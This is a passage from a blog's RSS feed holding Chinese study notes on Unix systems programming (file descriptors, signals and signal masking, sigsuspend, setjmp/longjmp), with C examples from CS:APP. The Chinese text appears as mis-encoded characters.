#include &amp;quot;csapp.h&amp;quot; 
int main(int argc, char *argv[]) { 
	int fd1; 
	int s = getpid() &amp;amp; 0x1; 
	char c1, c2; 
	char *fname = argv[1]; 
	fd1 = Open(fname, O_RDONLY, 0); 
	Read(fd1, &amp;amp;c1, 1); 
	if (fork()) { /* Parent */ 
		sleep(s); Read(fd1, &amp;amp;c2, 1); 
		printf(&amp;quot;Parent: c1 = %c, c2 = %c\n&amp;quot;, c1, c2); 
	} else { /* Child */ 
		sleep(1-s); 
		Read(fd1, &amp;amp;c2, 1); 
		printf(&amp;quot;Child: c1 = %c, c2 = %c\n&amp;quot;, c1, c2); 
	} 
	return 0; 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;fnameçš„å†…å®¹æ˜¯ä»€ä¹ˆ?&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;#include &amp;quot;csapp.h&amp;quot; 
int main(int argc, char *argv[]) { 
	int fd1, fd2, fd3; 
	char *fname = argv[1]; 
	fd1 = Open(fname, O_CREAT|O_TRUNC|O_RDWR, S_IRUSR|S_IWUSR); 
	Write(fd1, &amp;quot;pqrs&amp;quot;, 4); 
	fd3 = Open(fname, O_APPEND|O_WRONLY, 0); 
	Write(fd3, &amp;quot;jklmn&amp;quot;, 5); 
	fd2 = dup(fd1); /* Allocates descriptor */ 
	Write(fd2, &amp;quot;wxyz&amp;quot;, 4); 
	Write(fd3, &amp;quot;ef&amp;quot;, 2); 
	return 0; 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;éå†è·å–ç›®å½•ä¸‹çš„æ–‡ä»¶å:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;dirent.h&amp;gt;
{ 
	DIR *directory; 
	struct dirent *de; 
	... 
	if (!(directory = opendir(dir_name))) 
		error(&amp;quot;Failed to open directory&amp;quot;); 
	... 
	while (0 != (de = readdir(directory)))
		printf(&amp;quot;Found file: %s\n&amp;quot;, de-&amp;gt;d_name);
	... 
	closedir(directory); 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h1&gt;æ ‡å‡†I/Oå‡½æ•°&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;æ‰“å¼€/å…³é—­æ–‡ä»¶: &lt;code&gt;fopen&lt;/code&gt;&amp;amp;&lt;code&gt;fclose&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;è¯»/å†™å­—èŠ‚æµ: &lt;code&gt;fread&lt;/code&gt;&amp;amp;&lt;code&gt;fwrite&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;è¯»/å†™è¡Œæ–‡æœ¬: &lt;code&gt;fgets&lt;/code&gt;&amp;amp;&lt;code&gt;fputs&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;æ ¼å¼åŒ–è¾“å…¥/è¾“å‡º: &lt;code&gt;fscanf&lt;/code&gt;&amp;amp;&lt;code&gt;fprintf&lt;/code&gt;
è¿™äº›æ ‡å‡†I/Oå‡½æ•°éƒ½æœ‰ç¼“å†²åŒº&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Unix I/O,æ ‡å‡†I/Oå’Œè‡ªå®šä¹‰I/Oå‡½æ•°&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250204114508.png&quot; alt=&quot;&quot;&gt;
é€šè¿‡è‡ªå®šä¹‰I/Oå‡½æ•°,æ»¡è¶³ä¸ªæ€§åŒ–éœ€æ±‚.
æ ¹æ®ä¸åŒåœºæ™¯,é€‰æ‹©ä¸åŒçš„I/Oå‡½æ•°.&lt;/p&gt;
&lt;hr&gt;
&lt;blockquote&gt;
&lt;p&gt;æ¨èé˜…è¯»:ã€ŠUnixç¯å¢ƒé«˜çº§ç¼–ç¨‹ã€‹&lt;/p&gt;
&lt;/blockquote&gt;
</content:encoded><dc:creator>Dalekov</dc:creator><pubDate>Mon, 03 Feb 2025 00:00:00 GMT</pubDate></item><item><title>å¼‚å¸¸æ§åˆ¶æµ(ä¿¡å·å’Œéå±€éƒ¨è·³è½¬)</title><link>https://www.tankimzeg.top/blog/%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81%E4%BF%A1%E5%8F%B7%E5%92%8C%E9%9D%9E%E5%B1%80%E9%83%A8%E8%B7%B3%E8%BD%AC/</link><guid isPermaLink="true">https://www.tankimzeg.top/blog/%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81%E4%BF%A1%E5%8F%B7%E5%92%8C%E9%9D%9E%E5%B1%80%E9%83%A8%E8%B7%B3%E8%BD%AC/</guid><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://www.tankimzeg.top/blog/%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81%E4%BF%A1%E5%8F%B7%E5%92%8C%E9%9D%9E%E5%B1%80%E9%83%A8%E8%B7%B3%E8%BD%AC/&quot;&gt;https://www.tankimzeg.top/blog/%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81%E4%BF%A1%E5%8F%B7%E5%92%8C%E9%9D%9E%E5%B1%80%E9%83%A8%E8%B7%B3%E8%BD%AC/&lt;/a&gt;&lt;/blockquote&gt; &lt;h1&gt;Linuxè¿›ç¨‹å±‚æ¬¡ç»“æ„&lt;/h1&gt;
&lt;p&gt;å¯åŠ¨ç³»ç»Ÿæ—¶åˆ›å»ºçš„ç¬¬ä¸€ä¸ªè¿›ç¨‹æ—¶initè¿›ç¨‹,å®ƒçš„PIDæ˜¯1.ç³»ç»Ÿä¸Šå…¶ä»–æ‰€æœ‰è¿›ç¨‹éƒ½æ˜¯initè¿›ç¨‹çš„å­è¿›ç¨‹.
initè¿›ç¨‹å¯åŠ¨åä¼šåˆ›å»ºå®ˆæŠ¤è¿›ç¨‹.ç„¶åæ˜¯ç™»å½•è¿›ç¨‹login shell.
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250203150254.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h1&gt;ä¿¡å·(Signal)&lt;/h1&gt;
&lt;p&gt;ä¿¡å·æ˜¯ä¸€æ¡ä¿¡æ¯,é€šçŸ¥è¿›ç¨‹ç³»ç»Ÿä¸­å‘ç”Ÿäº†æŸç±»äº‹ä»¶.
ä¿¡å·æ˜¯ç”±å†…æ ¸å‘å‡ºçš„(å…¶ä»–è¿›ç¨‹å¯ä»¥è¯·æ±‚å†…æ ¸å‘å‡ºä¿¡å·)
ä¿¡å·æºå¸¦çš„ä¿¡æ¯æ˜¯ä¸€ä¸ªæ•´æ•°ID(1~30).å¦‚:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;ID&lt;/th&gt;
&lt;th&gt;åç§°&lt;/th&gt;
&lt;th&gt;é»˜è®¤è¡Œä¸º&lt;/th&gt;
&lt;th&gt;åæ˜ äº‹ä»¶&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;SIGINT&lt;/td&gt;
&lt;td&gt;ç»ˆæ­¢&lt;/td&gt;
&lt;td&gt;Ctrl+C&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;9&lt;/td&gt;
&lt;td&gt;SIGKILL&lt;/td&gt;
&lt;td&gt;ç»ˆæ­¢&lt;/td&gt;
&lt;td&gt;kill&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;11&lt;/td&gt;
&lt;td&gt;SIGSEGV&lt;/td&gt;
&lt;td&gt;ç»ˆæ­¢å¹¶è½¬å‚¨æ ¸å¿ƒ&lt;/td&gt;
&lt;td&gt;Segmentation fault&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;14&lt;/td&gt;
&lt;td&gt;SIGALRM&lt;/td&gt;
&lt;td&gt;ç»ˆæ­¢&lt;/td&gt;
&lt;td&gt;è®¡æ—¶å™¨ä¿¡å·&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;17&lt;/td&gt;
&lt;td&gt;SIGCHLD&lt;/td&gt;
&lt;td&gt;å¿½ç•¥&lt;/td&gt;
&lt;td&gt;å­è¿›ç¨‹åœæ­¢æˆ–ç»ˆæ­¢&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h2&gt;å‘é€ä¿¡å·&lt;/h2&gt;
&lt;p&gt;å†…æ ¸å‘é€ä¿¡å·çš„åŸå› :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;å†…æ ¸å‘ç°æŸäº›äº‹ä»¶&lt;/li&gt;
&lt;li&gt;å¦ä¸€ä¸ªè¿›ç¨‹è¯·æ±‚å†…æ ¸ä¼ é€’ä¿¡å·ç»™å¦ä¸€ä¸ªè¿›ç¨‹.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;å†…æ ¸é€šè¿‡æ›´æ–°ç›®æ ‡è¿›ç¨‹çš„&lt;strong&gt;ä¸Šä¸‹æ–‡&lt;/strong&gt;æ¥å®ç°å‘é€ä¿¡å·çš„åŠŸèƒ½.&lt;/p&gt;
&lt;h3&gt;è¿›ç¨‹ç»„(Process Group)&lt;/h3&gt;
&lt;p&gt;æ¯ä¸€ä¸ªè¿›ç¨‹å±äºæŸä¸€ä¸ªè¿›ç¨‹ç»„.
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250203160042.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;getpgrp()&lt;/code&gt;: è·å–å½“å‰è¿›ç¨‹çš„è¿›ç¨‹ç»„.
&lt;code&gt;setpgid()&lt;/code&gt;: æ”¹å˜è¿›ç¨‹çš„è¿›ç¨‹ç»„.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;/bin/killç¨‹åºèƒ½å¤Ÿå‘è¿›ç¨‹å’Œè¿›ç¨‹ç»„å‘é€ä¿¡å·:&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;kill -9 24818
&lt;/code&gt;&lt;/pre&gt;
 (å‘24818è¿›ç¨‹å‘é€ID 9:SIGKILLä¿¡å·)&lt;pre&gt;&lt;code class=&quot;language-shell&quot;&gt;kill -9 -24817
&lt;/code&gt;&lt;/pre&gt;
 (å‘è¿›ç¨‹ç»„24817å‘é€SIGKILLä¿¡å·).&lt;/li&gt;
&lt;li&gt;keyboard interrupt.
Ctrl+C:å‘å‰å°è¿›ç¨‹ç»„çš„æ‰€æœ‰è¿›ç¨‹å‘é€SIGINT(ç»ˆæ­¢)
Ctrl+Z:å‘å‰å°è¿›ç¨‹ç»„çš„æ‰€æœ‰è¿›ç¨‹å‘é€SIGSTP(æš‚åœ)&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;æ¥æ”¶ä¿¡å·&lt;/h2&gt;
&lt;p&gt;ç›®æ ‡ç¨‹åºæ¥åˆ°ä¿¡å·å,ä»¥æŸç§æ–¹å¼å¯¹ä¿¡å·åšå‡ºå›åº”.
å›åº”æ–¹å¼:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;å¿½ç•¥ä¿¡å·&lt;/li&gt;
&lt;li&gt;ç»ˆæ­¢è¿›ç¨‹&lt;/li&gt;
&lt;li&gt;æ•è·ä¿¡å·,ç„¶åæ‰§è¡Œå“åº”çš„ä¿¡å·å¤„ç†æœºåˆ¶(æœ‰ç‚¹åƒå¼‚å¸¸å¤„ç†[[å¼‚å¸¸æ§åˆ¶æµ(å¼‚å¸¸å’Œè¿›ç¨‹)#å¼‚å¸¸è¡¨]])
  &lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250203153948.png&quot; alt=&quot;&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;å‡è®¾å†…æ ¸ä»å¼‚å¸¸å¤„ç†ä¸­è¿”å›,å‡†å¤‡å°†æ§åˆ¶æƒäº¤ä»˜ç»™è¿›ç¨‹p
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250203163848.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;ä¸è¦å¿˜äº†,ä¸Šä¸‹æ–‡åˆ‡æ¢æ˜¯é€šè¿‡å¼‚å¸¸æ¥å¤„ç†çš„&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;å†…æ ¸å…ˆè®¡ç®—è¿›ç¨‹på¾…å¤„ç†ä¸”æœªé˜»å¡çš„ä¿¡å·:
&lt;code&gt;pnb = peding &amp;amp; ~blocked&lt;/code&gt;
å¦‚æœ &lt;code&gt;pnb==0&lt;/code&gt; ,å°†æ§åˆ¶æƒäº¤ä»˜è¿›ç¨‹p.
å¦‚æœ &lt;code&gt;pnb!=0&lt;/code&gt; ,é€ä¸ªå¤„ç†éé›¶ä½çš„ä¿¡å·,è¿™å°†å¼•å‘è¿›ç¨‹pçš„ä¿¡å·å¤„ç†,ç›´åˆ°æ‰€æœ‰éé›¶ä½å¤„ç†å®Œæˆ.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;[!understanding] 
æˆ‘çš„ç†è§£æ˜¯,è¿™äº›ä¿¡å·æ˜¯åœ¨pè¿›ç¨‹æš‚åœæ—¶å‘æ¥çš„,åœ¨é‡æ–°è¿è¡Œpå‰å†…æ ¸è¦å…ˆå¤„ç†æ‰è¿™äº›å¾…å¤„ç†ä¿¡å·.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;æ¯ä¸ªä¿¡å·ç±»å‹æœ‰å¯¹åº”çš„é»˜è®¤å¤„ç†è¡Œä¸º,ä¸ºä»¥ä¸‹å‡ ç§ä¹‹ä¸€:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ç»ˆæ­¢&lt;/li&gt;
&lt;li&gt;ç»ˆæ­¢å¹¶è½¬å‚¨æ ¸å¿ƒ&lt;/li&gt;
&lt;li&gt;åœæ­¢ç›´åˆ°SIGCONTç»§ç»­æ‰§è¡Œ&lt;/li&gt;
&lt;li&gt;å¿½ç•¥&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸€ä¸ªå«åš&lt;code&gt;signal&lt;/code&gt;çš„ç³»ç»Ÿè°ƒç”¨æ¥ä¿®æ”¹é»˜è®¤è¡Œä¸º:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;handler_t *signal(int signum, handler_t *handler);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å‚æ•°handlerçš„ä¸åŒå€¼:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;SIG_IGN: å¿½ç•¥signumç±»å‹çš„ä¿¡å·.&lt;/li&gt;
&lt;li&gt;SIG_DFL: æ‰§è¡Œsignumç±»å‹ä¿¡å·çš„é»˜è®¤è¡Œä¸º&lt;/li&gt;
&lt;li&gt;æŒ‡å®šçš„ä¿¡å·å¤„ç†å‡½æ•°.ç¨‹åºæ”¶åˆ°signumç±»å‹ä¿¡å·åä¼šæ‰§è¡Œå¯¹åº”çš„ä¿¡å·å¤„ç†å‡½æ•°,è¯¥ä¿¡å·å¤„ç†å‡½æ•°è¿”å›åç¨‹åºå›åˆ°ä¹‹å‰çš„ä½ç½®ç»§ç»­æ‰§è¡Œ.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ä¿¡å·å¤„ç†ç¨‹åºä¸ä¸»ç¨‹åºè¿è¡Œåœ¨åŒä¸€ä¸ªè¿›ç¨‹é‡Œ,æ˜¯ä¸»ç¨‹åºçš„å¹¶å‘æµ.
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250203173014.png&quot; alt=&quot;&quot;&gt;
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250203173057.png&quot; alt=&quot;&quot;&gt;
ä¿¡å·å¤„ç†ç¨‹åºä¹Ÿå¯ä»¥è¢«å…¶ä»–ä¿¡å·å¤„ç†ç¨‹åºæ‰“æ–­,ä½†ä¸èƒ½è¢«åŒç§ä¿¡å·æ‰“æ–­:
&lt;img src=&quot;https://www.tankimzeg.top/attachments/Pasted%20image%2020250203173323.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2&gt;å¾…å¤„ç†ä¿¡å·&lt;/h2&gt;
&lt;p&gt;**å¾…å¤„ç†(pending)**ä¿¡å·:å·²ç»ç”±å†…æ ¸å‘å‡ºä½†è¿˜æœªæ”¶åˆ°.
ä»»ä½•æ—¶å€™,ä¸€ç§ç±»å‹çš„å¾…å¤„ç†ä¿¡å·åªèƒ½æœ‰ä¸€ä¸ª,å¤šä½™çš„å¿½ç•¥.&lt;/p&gt;
&lt;p&gt;è¿›ç¨‹æ— æ³•é˜»æ­¢ä¿¡å·çš„åˆ°æ¥,ä½†æ˜¯å¯ä»¥**é˜»å¡(blocked)**å¯¹ä¿¡å·çš„å¤„ç†/å“åº”.&lt;/p&gt;
&lt;p&gt;å¯¹äºæ¯ä¸ªè¿›ç¨‹,å†…æ ¸ç»´æŠ¤ä¸€ä¸ª32ä½çš„&lt;strong&gt;å¾…å¤„ç†/é˜»å¡å‘é‡(pending and blocked bit vector)&lt;/strong&gt;.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;pending: ä»£è¡¨å¾…å¤„ç†ä¿¡å·çš„é›†åˆ.
  å½“kä¿¡å·ä¼ é€’æ—¶,è®¾ç½®ç¬¬kä½;å½“kä¿¡å·æ¥æ”¶æ—¶,æ¸…é™¤ç¬¬kä½.(è¿™ä¹Ÿæ˜¯ä¸€ç±»å¾…å¤„ç†ä¿¡å·åªæœ‰1ä¸ªçš„åŸå› )&lt;/li&gt;
&lt;li&gt;blocked: ä»£è¡¨é˜»å¡ä¿¡å·çš„é›†åˆ.
  é€šè¿‡&lt;code&gt;sigprocmask&lt;/code&gt;å‡½æ•°è®¾ç½®æˆ–æ¸…é™¤(signal mask).&lt;ol&gt;
&lt;li&gt;éšå¼é˜»å¡æœºåˆ¶
 å†…æ ¸é˜»å¡æ­£è¢«å¤„ç†çš„ä¿¡å·ä½œä¸ºå¾…å¤„ç†ä¿¡å·.ä¾‹å¦‚:
 SIGINTå¤„ç†å‡½æ•°ä¸èƒ½è¢«å¦ä¸€ä¸ªSIGINTä¿¡å·æ‰“æ–­.&lt;/li&gt;
&lt;li&gt;æ˜¾ç¤ºé˜»å¡/è§£é™¤é˜»å¡
 &lt;code&gt;sigprocmask&lt;/code&gt;å‡½æ•°ä»¥åŠé…å¥—çš„ &lt;code&gt;sigemptyset, sigfullset, sigaddset, sigdelset&lt;/code&gt;.
 ç”¨ä¾‹:&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;sigset_t mask, prev_mask; 
sigemptyset(&amp;amp;mask); 
sigaddset(&amp;amp;mask, SIGINT); 

/* Block SIGINT and save previous blocked set */
sigprocmask(SIG_BLOCK, &amp;amp;mask, &amp;amp;prev_mask); 
 {
    /* Code region that will not be interrupted by SIGINT */ 
 }
/* Restore previous blocked set, unblocking SIGINT */ 
sigprocmask(SIG_SETMASK, &amp;amp;prev_mask, NULL);
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;å®‰å…¨çš„ä¿¡å·å¤„ç†å‡½æ•°&lt;/h2&gt;
&lt;p&gt;ä¿¡å·å¤„ç†éå¸¸å¤æ‚,å› ä¸ºå®ƒæ˜¯å¹¶å‘æµ,æ¶‰åŠå¹¶å‘ç¼–ç¨‹çš„ç†è§£.æˆ‘ç°åœ¨è¿˜ä¸æ˜¯å¾ˆç†è§£.
ç¼–å†™å®‰å…¨çš„ä¿¡å·å¤„ç†å‡½æ•°çš„å‡†åˆ™:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;G0: Keep your handlers as simple as possible&lt;ul&gt;
&lt;li&gt;å¦‚:Set a global flag and return&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Call only async-signal-safe func&amp;amp;ons in your handlers&lt;ul&gt;
&lt;li&gt;printf, sprintf, malloc, and exit are not safe!&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Save and restore errno on entry and exit&lt;ul&gt;
&lt;li&gt;So that other handlers donâ€™t overwrite your value of errno&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Protect accesses to shared data structures by temporarily blocking all signals.&lt;ul&gt;
&lt;li&gt;To prevent possible corrup;on&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Declare global variables as volatile&lt;ul&gt;
&lt;li&gt;To prevent compiler from storing them in a register&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Declare global flags as volatile sig_atomic_t&lt;ul&gt;
&lt;li&gt;flag: variable that is only read or wriien (e.g. flag = 1, not flag++)&lt;/li&gt;
&lt;li&gt;Flag declared this way does not need to be protected like other globals&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;å‡½æ•°æ˜¯&lt;strong&gt;å¼‚æ­¥ä¿¡å·å®‰å…¨&lt;/strong&gt;çš„,å¦‚æœå®ƒå¯é‡å…¥æˆ–ä¸èƒ½è¢«å…¶ä»–ä¿¡å·æ‰“æ–­.(ä½¿ç”¨ &lt;code&gt;man 7 signal&lt;/code&gt;æŸ¥çœ‹å¼‚æ­¥ä¿¡å·å®‰å…¨çš„å‡½æ•°).&lt;/p&gt;
&lt;p&gt;è¿™éƒ¨åˆ†å®åœ¨éš¾ä»¥è¨€è¯´,åªå¥½åœ¨ä»£ç ä¸­ä½“ä¼š.
çˆ¶è¿›ç¨‹é€šè¿‡ä¿¡å·ç®¡ç†å­è¿›ç¨‹çš„æ—¶å€™å­˜åœ¨&amp;quot;ç«äº‰&amp;quot;çš„å…³ç³»,ä¹Ÿå°±æ˜¯æ‰§è¡Œè¯­å¥çš„åŸå­æ€§.å¦‚æœå¤„ç†ä¿¡å·çš„è¯­å¥æ²¡æœ‰è‰¯å¥½çš„åŸå­æ€§,åœ¨å¤„ç†ä¸€åŠçš„æ—¶å€™ä¿¡å·ä¼ è¿‡æ¥äº†,å°±ä¼šå¯¼è‡´ä¸ä¸€è‡´çš„è¡Œä¸º.
å¯¹æ¯”ä»¥ä¸‹ä»£ç æ®µ:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* procmask1.c */
int main(int argc, char **argv) { 
	int pid; 
	sigset_t mask_all, prev_all; 
	Sigfillset(&amp;amp;mask_all); 
	Signal(SIGCHLD, handler); 
	initjobs(); /* Initialize the job list */ 
	
	while (1) { 
		if ((pid = Fork()) == 0) { /* Child */ 
			Execve(&amp;quot;/bin/date&amp;quot;, argv, NULL); 
		} 
		Sigprocmask(SIG_BLOCK, &amp;amp;mask_all, &amp;amp;prev_all); /* Parent */ 
		addjob(pid); /* Add the child to the job list */ 
		Sigprocmask(SIG_SETMASK, &amp;amp;prev_all, NULL); 
	} 
	exit(0); 
}

void handler(int sig) { 
	int olderrno = errno; 
	sigset_t mask_all, prev_all; 
	pid_t pid; 
	
	Sigfillset(&amp;amp;mask_all); 
	while ((pid = waitpid(-1, NULL, 0)) &amp;gt; 0) { /* Reap child */ 
		Sigprocmask(SIG_BLOCK, &amp;amp;mask_all, &amp;amp;prev_all); 
		deletejob(pid); /* Delete the child from the job list */ 
		Sigprocmask(SIG_SETMASK, &amp;amp;prev_all, NULL); 
	} 
	if (errno != ECHILD) Sio_error(&amp;quot;waitpid error&amp;quot;); 
	errno = olderrno; 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;é—®é¢˜åœ¨äºå­è¿›ç¨‹åœ¨çˆ¶è¿›ç¨‹æ²¡æ¥å¾—åŠ&lt;code&gt;addjob()&lt;/code&gt;ä¹‹å‰å°±ç»“æŸäº†,&lt;code&gt;handler()&lt;/code&gt;å‡½æ•°ä¼šåˆ é™¤åˆ—è¡¨ä¸­ä¸å­˜åœ¨çš„å…ƒç´ ,ç„¶åçˆ¶è¿›ç¨‹å†æŠŠä¸€ä¸ªå·²ç»ç»“æŸçš„è¿›ç¨‹åŠ å…¥å·¥ä½œåˆ—è¡¨.
æ‰€ä»¥å¯¹å…¶ä¿®æ”¹å¦‚ä¸‹:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;int main(int argc, char **argv) { 
	int pid; 
	sigset_t mask_all, mask_one, prev_one; 
	
	Sigfillset(&amp;amp;mask_all); Sigemptyset(&amp;amp;mask_one); 
	Sigaddset(&amp;amp;mask_one, SIGCHLD); 
	Signal(SIGCHLD, handler); 
	initjobs(); /* Initialize the job list */ 
	
	while (1) { 
	Sigprocmask(SIG_BLOCK, &amp;amp;mask_one, &amp;amp;prev_one); /* Block SIGCHLD */ 
		if ((pid = Fork()) == 0) { /* Child process */ 
			Sigprocmask(SIG_SETMASK, &amp;amp;prev_one, NULL); /* Unblock SIGCHLD */ 
			Execve(&amp;quot;/bin/date&amp;quot;, argv, NULL); 
		} 
	Sigprocmask(SIG_BLOCK, &amp;amp;mask_all, NULL); /* Parent process */ 
	addjob(pid); /* Add the child to the job list */ 
	Sigprocmask(SIG_SETMASK, &amp;amp;prev_one, NULL); /* Unblock SIGCHLD */ 
	} 
	exit(0); 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ˜¾å¼ç­‰å¾…ä¿¡å·:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;int sigsuspend(const sigset_t *mask);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ç›¸å½“äºæœ‰åŸå­æ€§çš„&lt;code&gt;pause()&lt;/code&gt;å‡½æ•°.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;volatile sig_atomic_t pid; 

void sigchld_handler(int s) { 
	int olderrno = errno; 
	pid = Waitpid(-1, NULL, 0); /* Main is waiting for nonzero pid */ 
	errno = olderrno; 
} 

void sigint_handler(int s) { }

int main(int argc, char **argv) { 
	sigset_t mask, prev; 
	Signal(SIGCHLD, sigchld_handler); 
	Signal(SIGINT, sigint_handler); 
	Sigemptyset(&amp;amp;mask); 
	Sigaddset(&amp;amp;mask, SIGCHLD); 
	
	while (1) { 
		Sigprocmask(SIG_BLOCK, &amp;amp;mask, &amp;amp;prev); /* Block SIGCHLD */ 
		if (Fork() == 0) /* Child */
			 exit(0); 
			 
		/* Wait for SIGCHLD to be received */ 
		pid = 0; 
		while (!pid) 
			Sigsuspend(&amp;amp;prev); 
			
		/* Optionally unblock SIGCHLD */ 
		Sigprocmask(SIG_SETMASK, &amp;amp;prev, NULL); 
		/* Do some work after receiving SIGCHLD */ 
		printf(&amp;quot;.&amp;quot;); 
	} 
	exit(0); 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;sigsuspend(&amp;amp;prev)&lt;/code&gt;å‡½æ•°åœ¨æ‰§è¡Œçš„æ—¶å€™,ä¼šåœ¨å†…éƒ¨åŸå­æ€§åœ°è§£é™¤ä¿¡å·é˜»å¡,ç„¶åæ˜¯&lt;code&gt;pause()&lt;/code&gt;å‡½æ•°,æœ€åé‡æ–°åŠ ä¸Šä¿¡å·é˜»å¡.&lt;/p&gt;
&lt;h1&gt;Céæœ¬åœ°è·³è½¬:setjmp/longjmp&lt;/h1&gt;
&lt;p&gt;ä»æ·±å±‚åµŒå¥—ä¸­ç«‹å³è¿”å›&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;int setjmp(jum_buf j);
void longjmp(jmp_buf j, int i);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;setjmp&lt;/code&gt;åœ¨jmp_bufä¸­å­˜å‚¨å½“å‰ä½ç½®çš„æ ˆæŒ‡é’ˆè®°ä½å½“å‰ä½ç½®,è¿”å›0.
&lt;code&gt;longjmp&lt;/code&gt;è¿”å›åˆ°&lt;code&gt;setjmp&lt;/code&gt;çš„ä½ç½®,&lt;code&gt;setjmp&lt;/code&gt;è¿”å›i.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/* Deeply nested function foo */ 
void foo(void) { 
	if (error1) longjmp(buf, 1); 
	bar(); 
} 

void bar(void) { 
	if (error2) longjmp(buf, 2); 
}

jmp_buf buf; 
int error1 = 0; 
int error2 = 1; 

void foo(void), bar(void); 

int main() { 
	switch(setjmp(buf)) { 
	case 0: foo(); break; 
	case 1: printf(&amp;quot;Detected an error1 condition in foo\n&amp;quot;); break; 
	case 2: printf(&amp;quot;Detected an error2 condition in foo\n&amp;quot;); break; 
	default: printf(&amp;quot;Unknown error condition in foo\n&amp;quot;); 
	} 
	exit(0); 
}
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;å¤ªæ™¦æ¶©äº†,ä¸æ˜“æ·±ç©¶...&lt;/p&gt;
&lt;/blockquote&gt;
